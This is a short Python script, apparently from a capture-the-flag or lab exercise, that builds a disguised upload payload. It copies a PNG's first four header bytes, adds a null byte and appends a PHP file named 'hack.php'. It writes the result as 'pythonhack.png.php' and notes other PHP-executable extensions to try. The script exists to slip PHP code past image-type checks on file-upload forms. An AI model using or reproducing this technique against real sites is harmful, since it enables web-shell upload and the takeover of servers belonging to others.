
php = open('hack.php', 'rb')
f = open('python.png', 'rb')
g = open('pythonhack.png.php', 'wb')

g.write(f.read()[:4])
g.write(b'\x00')
g.write(php.read())

# .php .html .pht .phtml(X

php.close()
f.close()
g.close()
g = open('pythonhack.png.php', 'rb')
print(g.read())
g.close()